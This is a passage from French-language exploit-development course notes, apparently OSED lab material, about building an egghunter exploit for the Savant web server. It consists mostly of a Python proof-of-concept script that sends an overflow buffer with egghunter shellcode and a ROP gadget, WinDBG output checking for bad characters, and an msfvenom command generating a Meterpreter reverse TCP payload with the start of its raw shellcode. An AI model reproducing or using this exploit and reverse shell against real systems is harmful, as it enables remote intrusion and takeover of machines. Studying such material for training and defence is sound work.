<a id="__codelineno-60-6" name="__codelineno-60-6" href="#__codelineno-60-6"></a><span class="n">0</span><span class="p">:</span><span class="n">005</span><span class="p">&gt;</span> <span class="n">dc</span> <span class="nv">@edi</span> <span class="p">-</span> <span class="n">0x08</span>
<a id="__codelineno-60-7" name="__codelineno-60-7" href="#__codelineno-60-7"></a><span class="n">018f5b2e</span>  <span class="n">74303077</span> <span class="n">74303077</span> <span class="n">44444444</span> <span class="n">44444444</span>  <span class="n">w00tw00tDDDDDDDD</span>
<a id="__codelineno-60-8" name="__codelineno-60-8" href="#__codelineno-60-8"></a><span class="n">018f5b3e</span>  <span class="n">44444444</span> <span class="n">44444444</span> <span class="n">44444444</span> <span class="n">44444444</span>  <span class="n">DDDDDDDDDDDDDDDD</span>
<a id="__codelineno-60-9" name="__codelineno-60-9" href="#__codelineno-60-9"></a><span class="p">[...]</span>
</code></pre></div>
<p>Problématique récurrente durant le développement d'exploit : trouver le compromis entre portabilité et taille d'exploit.</p>
<h4 id="recuperer-un-shell">Récupérer un shell</h4>
<p>Maintenant que le <em>egghunter</em> fonctionne, on peut mettre en oeuvre notre shellcode.</p>
<p>Il faut se rappeler que le second buffer est dans une page mémoire différente allouée par le tas (<em>heap</em>). On ne connait pas les bad char de cette page mémoire et on a vu précédemment que les mauvais caractères ne sont pas universels a une application.</p>
<p>On met à jour la preuve de concept avec les tous les caractères hexadécimal en les positionnant dans le second <em>buffer</em> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-61-4" name="__codelineno-61-4" href="#__codelineno-61-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-61-5" name="__codelineno-61-5" href="#__codelineno-61-5"></a>
<a id="__codelineno-61-6" name="__codelineno-61-6" href="#__codelineno-61-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-61-7" name="__codelineno-61-7" href="#__codelineno-61-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-61-8" name="__codelineno-61-8" href="#__codelineno-61-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
<a id="__codelineno-61-9" name="__codelineno-61-9" href="#__codelineno-61-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">253</span>
<a id="__codelineno-61-10" name="__codelineno-61-10" href="#__codelineno-61-10"></a>
<a id="__codelineno-61-11" name="__codelineno-61-11" href="#__codelineno-61-11"></a>  <span class="n">httpMethod</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x31\xC9\x85\xC9\x0F\x84\x11</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot; /&quot;</span>  <span class="c1"># xor ecx, ecx; test ecx, ecx; je 0x17 </span>
<a id="__codelineno-61-12" name="__codelineno-61-12" href="#__codelineno-61-12"></a>
<a id="__codelineno-61-13" name="__codelineno-61-13" href="#__codelineno-61-13"></a>  <span class="n">egghunter</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s2">&quot;</span> <span class="c1"># NOP sled</span>
<a id="__codelineno-61-14" name="__codelineno-61-14" href="#__codelineno-61-14"></a>             <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x66\x81\xca\xff\x0f\x42\x52\xb8</span><span class="s2">&quot;</span>
<a id="__codelineno-61-15" name="__codelineno-61-15" href="#__codelineno-61-15"></a>             <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x3a\xfe\xff\xff\xf7\xd8\xcd\x2e</span><span class="s2">&quot;</span>
<a id="__codelineno-61-16" name="__codelineno-61-16" href="#__codelineno-61-16"></a>             <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x3c\x05\x5a\x74\xeb\xb8\x77\x30</span><span class="s2">&quot;</span>
<a id="__codelineno-61-17" name="__codelineno-61-17" href="#__codelineno-61-17"></a>             <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x30\x74\x89\xd7\xaf\x75\xe6\xaf</span><span class="s2">&quot;</span>
<a id="__codelineno-61-18" name="__codelineno-61-18" href="#__codelineno-61-18"></a>             <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x75\xe3\xff\xe7</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-61-19" name="__codelineno-61-19" href="#__codelineno-61-19"></a>
<a id="__codelineno-61-20" name="__codelineno-61-20" href="#__codelineno-61-20"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">egghunter</span><span class="p">))</span>
<a id="__codelineno-61-21" name="__codelineno-61-21" href="#__codelineno-61-21"></a>  <span class="n">inputBuffer</span><span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="p">(</span><span class="mh">0x418674</span><span class="p">))</span>                  <span class="c1"># 0x00418674 - pop eax; ret</span>
<a id="__codelineno-61-22" name="__codelineno-61-22" href="#__codelineno-61-22"></a>  <span class="n">httpEndRequest</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span>
<a id="__codelineno-61-23" name="__codelineno-61-23" href="#__codelineno-61-23"></a>
<a id="__codelineno-61-24" name="__codelineno-61-24" href="#__codelineno-61-24"></a>  <span class="n">badchars</span> <span class="o">=</span> <span class="p">(</span>
<a id="__codelineno-61-25" name="__codelineno-61-25" href="#__codelineno-61-25"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c</span><span class="s2">&quot;</span>
<a id="__codelineno-61-26" name="__codelineno-61-26" href="#__codelineno-61-26"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19</span><span class="s2">&quot;</span>
<a id="__codelineno-61-27" name="__codelineno-61-27" href="#__codelineno-61-27"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26</span><span class="s2">&quot;</span>
<a id="__codelineno-61-28" name="__codelineno-61-28" href="#__codelineno-61-28"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33</span><span class="s2">&quot;</span>
<a id="__codelineno-61-29" name="__codelineno-61-29" href="#__codelineno-61-29"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s2">&quot;</span>
<a id="__codelineno-61-30" name="__codelineno-61-30" href="#__codelineno-61-30"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d</span><span class="s2">&quot;</span>
<a id="__codelineno-61-31" name="__codelineno-61-31" href="#__codelineno-61-31"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a</span><span class="s2">&quot;</span>
<a id="__codelineno-61-32" name="__codelineno-61-32" href="#__codelineno-61-32"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67</span><span class="s2">&quot;</span>
<a id="__codelineno-61-33" name="__codelineno-61-33" href="#__codelineno-61-33"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74</span><span class="s2">&quot;</span>
<a id="__codelineno-61-34" name="__codelineno-61-34" href="#__codelineno-61-34"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81</span><span class="s2">&quot;</span>
<a id="__codelineno-61-35" name="__codelineno-61-35" href="#__codelineno-61-35"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e</span><span class="s2">&quot;</span>
<a id="__codelineno-61-36" name="__codelineno-61-36" href="#__codelineno-61-36"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b</span><span class="s2">&quot;</span>
<a id="__codelineno-61-37" name="__codelineno-61-37" href="#__codelineno-61-37"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8</span><span class="s2">&quot;</span>
<a id="__codelineno-61-38" name="__codelineno-61-38" href="#__codelineno-61-38"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5</span><span class="s2">&quot;</span>
<a id="__codelineno-61-39" name="__codelineno-61-39" href="#__codelineno-61-39"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2</span><span class="s2">&quot;</span>
<a id="__codelineno-61-40" name="__codelineno-61-40" href="#__codelineno-61-40"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf</span><span class="s2">&quot;</span>
<a id="__codelineno-61-41" name="__codelineno-61-41" href="#__codelineno-61-41"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc</span><span class="s2">&quot;</span>
<a id="__codelineno-61-42" name="__codelineno-61-42" href="#__codelineno-61-42"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9</span><span class="s2">&quot;</span>
<a id="__codelineno-61-43" name="__codelineno-61-43" href="#__codelineno-61-43"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6</span><span class="s2">&quot;</span>
<a id="__codelineno-61-44" name="__codelineno-61-44" href="#__codelineno-61-44"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s2">&quot;</span><span class="p">)</span> 
<a id="__codelineno-61-45" name="__codelineno-61-45" href="#__codelineno-61-45"></a>
<a id="__codelineno-61-46" name="__codelineno-61-46" href="#__codelineno-61-46"></a>  <span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;w00tw00t&quot;</span> <span class="o">+</span> <span class="n">badchars</span>  <span class="o">+</span>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x44</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">400</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">badchars</span><span class="p">))</span>
<a id="__codelineno-61-47" name="__codelineno-61-47" href="#__codelineno-61-47"></a>
<a id="__codelineno-61-48" name="__codelineno-61-48" href="#__codelineno-61-48"></a>  <span class="n">buf</span> <span class="o">=</span> <span class="n">httpMethod</span> <span class="o">+</span> <span class="n">egghunter</span> <span class="o">+</span> <span class="n">inputBuffer</span> <span class="o">+</span>  <span class="n">httpEndRequest</span> <span class="o">+</span> <span class="n">shellcode</span>
<a id="__codelineno-61-49" name="__codelineno-61-49" href="#__codelineno-61-49"></a>
<a id="__codelineno-61-50" name="__codelineno-61-50" href="#__codelineno-61-50"></a>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Sending buffer&quot;</span><span class="p">)</span>
<a id="__codelineno-61-51" name="__codelineno-61-51" href="#__codelineno-61-51"></a>  <span class="p">[</span><span class="o">...</span><span class="p">]</span>
</code></pre></div>
<p>On positionne le point d'arrêt sur <code>POP EAX</code> et on relance l'exécution :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="c">#</span>
<a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">bp</span> <span class="n">0x418674</span>
<a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a><span class="p">***</span> <span class="n">WARNING</span><span class="p">:</span> <span class="n">Unable</span> <span class="n">to</span> <span class="n">verify</span> <span class="n">checksum</span> <span class="k">for</span> <span class="n">C</span><span class="p">:\</span><span class="n">Savant</span><span class="p">\</span><span class="n">Savant</span><span class="p">.</span><span class="n">exe</span>
<a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">bl</span>
<a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a>     <span class="n">0</span> <span class="n">d</span> <span class="n">Enable</span> <span class="nb">Clear </span> <span class="n">00000000</span> <span class="n">e</span> <span class="n">1</span> <span class="n">0001</span> <span class="p">(</span><span class="n">0001</span><span class="p">)</span>  <span class="n">0</span><span class="p">:****</span>
<a id="__codelineno-62-6" name="__codelineno-62-6" href="#__codelineno-62-6"></a>     <span class="n">1</span> <span class="n">e</span> <span class="n">Disable</span> <span class="nb">Clear </span> <span class="n">00418674</span>     <span class="n">0001</span> <span class="p">(</span><span class="n">0001</span><span class="p">)</span>  <span class="n">0</span><span class="p">:****</span> <span class="n">Savant</span><span class="p">+</span><span class="n">0x18674</span>
<a id="__codelineno-62-7" name="__codelineno-62-7" href="#__codelineno-62-7"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">g</span>
</code></pre></div>
<p>Puis on relance l'exploit :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)-[/</span><span class="n">media</span><span class="p">/</span><span class="err">…</span><span class="p">/</span><span class="n">os</span><span class="p">/</span><span class="n">exp</span><span class="p">-</span><span class="n">301-osed</span><span class="p">/</span><span class="n">cours</span><span class="p">/</span><span class="n">cours6</span><span class="p">]</span>
<a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a><span class="err">└─</span><span class="p">$</span> <span class="n">python3</span> <span class="n">egg_v11</span><span class="p">.</span><span class="n">py</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">234</span><span class="p">.</span><span class="n">10</span>
<a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a><span class="n">Sending</span> <span class="n">buffer</span>
<a id="__codelineno-63-4" name="__codelineno-63-4" href="#__codelineno-63-4"></a><span class="n">Done</span><span class="p">!</span>
</code></pre></div>
<p>Le point d'arrêt est atteint. On cherche manuellement notre <em>egg</em> avec WinDBG. On le trouve à l'adresse <code>001e5b2e</code> et on affiche son contenu :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="n">Breakpoint</span> <span class="n">1</span> <span class="n">hit</span>
<a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">001e5778</span> <span class="n">ecx</span><span class="p">=</span><span class="n">0000000e</span> <span class="n">edx</span><span class="p">=</span><span class="n">77841670</span> <span class="n">esi</span><span class="p">=</span><span class="n">001e5778</span> <span class="n">edi</span><span class="p">=</span><span class="n">0041703c</span>
<a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a><span class="n">eip</span><span class="p">=</span><span class="n">00418674</span> <span class="n">esp</span><span class="p">=</span><span class="n">0455ea2c</span> <span class="n">ebp</span><span class="p">=</span><span class="n">41414141</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000206</span>
<a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a><span class="n">Savant</span><span class="p">+</span><span class="n">0x18674</span><span class="p">:</span>
<a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a><span class="n">00418674</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-64-7" name="__codelineno-64-7" href="#__codelineno-64-7"></a><span class="c">#</span>
<a id="__codelineno-64-8" name="__codelineno-64-8" href="#__codelineno-64-8"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">s</span> <span class="n">-a</span> <span class="n">0x0</span> <span class="n">L</span><span class="k">?</span><span class="n">80000000</span> <span class="n">w00tw00t</span>
<a id="__codelineno-64-9" name="__codelineno-64-9" href="#__codelineno-64-9"></a><span class="n">001e5b2e</span>  <span class="n">77</span> <span class="n">30</span> <span class="n">30</span> <span class="n">74</span> <span class="n">77</span> <span class="n">30</span> <span class="n">30</span> <span class="n">74</span><span class="p">-</span><span class="n">00</span> <span class="n">01</span> <span class="n">02</span> <span class="n">03</span> <span class="n">04</span> <span class="n">05</span> <span class="n">06</span> <span class="n">07</span>  <span class="n">w00tw00t</span><span class="p">........</span>
<a id="__codelineno-64-10" name="__codelineno-64-10" href="#__codelineno-64-10"></a><span class="c">#</span>
<a id="__codelineno-64-11" name="__codelineno-64-11" href="#__codelineno-64-11"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">db</span> <span class="n">001e5b2e</span> <span class="n">L110</span>
<a id="__codelineno-64-12" name="__codelineno-64-12" href="#__codelineno-64-12"></a><span class="n">001e5b2e</span>  <span class="n">77</span> <span class="n">30</span> <span class="n">30</span> <span class="n">74</span> <span class="n">77</span> <span class="n">30</span> <span class="n">30</span> <span class="n">74</span><span class="p">-</span><span class="n">00</span> <span class="n">01</span> <span class="n">02</span> <span class="n">03</span> <span class="n">04</span> <span class="n">05</span> <span class="n">06</span> <span class="n">07</span>  <span class="n">w00tw00t</span><span class="p">........</span>
<a id="__codelineno-64-13" name="__codelineno-64-13" href="#__codelineno-64-13"></a><span class="n">001e5b3e</span>  <span class="n">08</span> <span class="n">09</span> <span class="n">0a</span> <span class="n">0b</span> <span class="n">0c</span> <span class="n">0d</span> <span class="n">0e</span> <span class="n">0f</span><span class="p">-</span><span class="n">10</span> <span class="n">11</span> <span class="n">12</span> <span class="n">13</span> <span class="n">14</span> <span class="n">15</span> <span class="n">16</span> <span class="n">17</span>  <span class="p">................</span>
<a id="__codelineno-64-14" name="__codelineno-64-14" href="#__codelineno-64-14"></a><span class="n">001e5b4e</span>  <span class="n">18</span> <span class="n">19</span> <span class="n">1a</span> <span class="n">1b</span> <span class="n">1c</span> <span class="n">1d</span> <span class="n">1e</span> <span class="n">1f</span><span class="p">-</span><span class="n">20</span> <span class="n">21</span> <span class="n">22</span> <span class="n">23</span> <span class="n">24</span> <span class="n">25</span> <span class="n">26</span> <span class="n">27</span>  <span class="p">........</span> <span class="p">!</span><span class="s2">&quot;#$%&amp;&#39;</span>
<a id="__codelineno-64-15" name="__codelineno-64-15" href="#__codelineno-64-15"></a><span class="s2">001e5b5e  28 29 2a 2b 2c 2d 2e 2f-30 31 32 33 34 35 36 37  ()*+,-./01234567</span>
<a id="__codelineno-64-16" name="__codelineno-64-16" href="#__codelineno-64-16"></a><span class="s2">001e5b6e  38 39 3a 3b 3c 3d 3e 3f-40 41 42 43 44 45 46 47  89:;&lt;=&gt;?@ABCDEFG</span>
<a id="__codelineno-64-17" name="__codelineno-64-17" href="#__codelineno-64-17"></a><span class="s2">001e5b7e  48 49 4a 4b 4c 4d 4e 4f-50 51 52 53 54 55 56 57  HIJKLMNOPQRSTUVW</span>
<a id="__codelineno-64-18" name="__codelineno-64-18" href="#__codelineno-64-18"></a><span class="s2">001e5b8e  58 59 5a 5b 5c 5d 5e 5f-60 61 62 63 64 65 66 67  XYZ[\]^_</span><span class="se">`a</span><span class="s2">bcdefg</span>
<a id="__codelineno-64-19" name="__codelineno-64-19" href="#__codelineno-64-19"></a><span class="s2">001e5b9e  68 69 6a 6b 6c 6d 6e 6f-70 71 72 73 74 75 76 77  hijklmnopqrstuvw</span>
<a id="__codelineno-64-20" name="__codelineno-64-20" href="#__codelineno-64-20"></a><span class="s2">001e5bae  78 79 7a 7b 7c 7d 7e 7f-80 81 82 83 84 85 86 87  xyz{|}~.........</span>
<a id="__codelineno-64-21" name="__codelineno-64-21" href="#__codelineno-64-21"></a><span class="s2">001e5bbe  88 89 8a 8b 8c 8d 8e 8f-90 91 92 93 94 95 96 97  ................</span>
<a id="__codelineno-64-22" name="__codelineno-64-22" href="#__codelineno-64-22"></a><span class="s2">001e5bce  98 99 9a 9b 9c 9d 9e 9f-a0 a1 a2 a3 a4 a5 a6 a7  ................</span>
<a id="__codelineno-64-23" name="__codelineno-64-23" href="#__codelineno-64-23"></a><span class="s2">001e5bde  a8 a9 aa ab ac ad ae af-b0 b1 b2 b3 b4 b5 b6 b7  ................</span>
<a id="__codelineno-64-24" name="__codelineno-64-24" href="#__codelineno-64-24"></a><span class="s2">001e5bee  b8 b9 ba bb bc bd be bf-c0 c1 c2 c3 c4 c5 c6 c7  ................</span>
<a id="__codelineno-64-25" name="__codelineno-64-25" href="#__codelineno-64-25"></a><span class="s2">001e5bfe  c8 c9 ca cb cc cd ce cf-d0 d1 d2 d3 d4 d5 d6 d7  ................</span>
<a id="__codelineno-64-26" name="__codelineno-64-26" href="#__codelineno-64-26"></a><span class="s2">001e5c0e  d8 d9 da db dc dd de df-e0 e1 e2 e3 e4 e5 e6 e7  ................</span>
<a id="__codelineno-64-27" name="__codelineno-64-27" href="#__codelineno-64-27"></a><span class="s2">001e5c1e  e8 e9 ea eb ec ed ee ef-f0 f1 f2 f3 f4 f5 f6 f7  ................</span>
<a id="__codelineno-64-28" name="__codelineno-64-28" href="#__codelineno-64-28"></a><span class="s2">001e5c2e  f8 f9 fa fb fc fd fe ff-44 44 44 44 44 44 44 44  ........DDDDDDDD</span>
</code></pre></div>
<p>Aucun mauvais caractère n'est présent, pas même <code>00</code>. On peut donc générer un <em>shellcode</em> <em>reverse shell</em> Meterpreter :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)-[/</span><span class="n">media</span><span class="p">/</span><span class="err">…</span><span class="p">/</span><span class="n">os</span><span class="p">/</span><span class="n">exp</span><span class="p">-</span><span class="n">301-osed</span><span class="p">/</span><span class="n">cours</span><span class="p">/</span><span class="n">cours6</span><span class="p">]</span>
<a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a><span class="err">└─</span><span class="p">$</span> <span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">45</span><span class="p">.</span><span class="n">183</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">443</span> <span class="o">-f</span> <span class="n">python</span> <span class="n">-v</span>  <span class="n">payload</span>
<a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a><span class="p">[-]</span> <span class="n">No</span> <span class="n">platform</span> <span class="n">was</span> <span class="n">selected</span><span class="p">,</span> <span class="n">choosing</span> <span class="n">Msf</span><span class="p">::</span><span class="n">Module</span><span class="p">::</span><span class="n">Platform</span><span class="p">::</span><span class="n">Windows</span> <span class="n">from</span> <span class="n">the</span> <span class="n">payload</span>
<a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a><span class="p">[-]</span> <span class="n">No</span> <span class="n">arch</span> <span class="n">selected</span><span class="p">,</span> <span class="n">selecting</span> <span class="n">arch</span><span class="p">:</span> <span class="n">x86</span> <span class="n">from</span> <span class="n">the</span> <span class="n">payload</span>
<a id="__codelineno-65-5" name="__codelineno-65-5" href="#__codelineno-65-5"></a><span class="n">No</span> <span class="n">encoder</span> <span class="n">specified</span><span class="p">,</span> <span class="n">outputting</span> <span class="n">raw</span> <span class="n">payload</span>
<a id="__codelineno-65-6" name="__codelineno-65-6" href="#__codelineno-65-6"></a><span class="n">Payload</span> <span class="n">size</span><span class="p">:</span> <span class="n">354</span> <span class="n">bytes</span>
<a id="__codelineno-65-7" name="__codelineno-65-7" href="#__codelineno-65-7"></a><span class="n">Final</span> <span class="n">size</span> <span class="n">of</span> <span class="n">python</span> <span class="n">file</span><span class="p">:</span> <span class="n">1926</span> <span class="n">bytes</span>
<a id="__codelineno-65-8" name="__codelineno-65-8" href="#__codelineno-65-8"></a><span class="n">payload</span> <span class="p">=</span>  <span class="n">b</span><span class="s2">&quot;&quot;</span>
<a id="__codelineno-65-9" name="__codelineno-65-9" href="#__codelineno-65-9"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5&quot;</span>
<a id="__codelineno-65-10" name="__codelineno-65-10" href="#__codelineno-65-10"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b&quot;</span>
<a id="__codelineno-65-11" name="__codelineno-65-11" href="#__codelineno-65-11"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x72\x28\x31\xff\x0f\xb7\x4a\x26\x31\xc0\xac&quot;</span>
<a id="__codelineno-65-12" name="__codelineno-65-12" href="#__codelineno-65-12"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7&quot;</span>
<a id="__codelineno-65-13" name="__codelineno-65-13" href="#__codelineno-65-13"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x49\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57&quot;</span>
<a id="__codelineno-65-14" name="__codelineno-65-14" href="#__codelineno-65-14"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0&quot;</span>
<a id="__codelineno-65-15" name="__codelineno-65-15" href="#__codelineno-65-15"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x8b\x58\x20\x8b\x48\x18\x50\x01\xd3\x85\xc9&quot;</span>
<a id="__codelineno-65-16" name="__codelineno-65-16" href="#__codelineno-65-16"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x74\x3c\x49\x31\xff\x8b\x34\x8b\x01\xd6\x31&quot;</span>
<a id="__codelineno-65-17" name="__codelineno-65-17" href="#__codelineno-65-17"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4&quot;</span>
<a id="__codelineno-65-18" name="__codelineno-65-18" href="#__codelineno-65-18"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58&quot;</span>
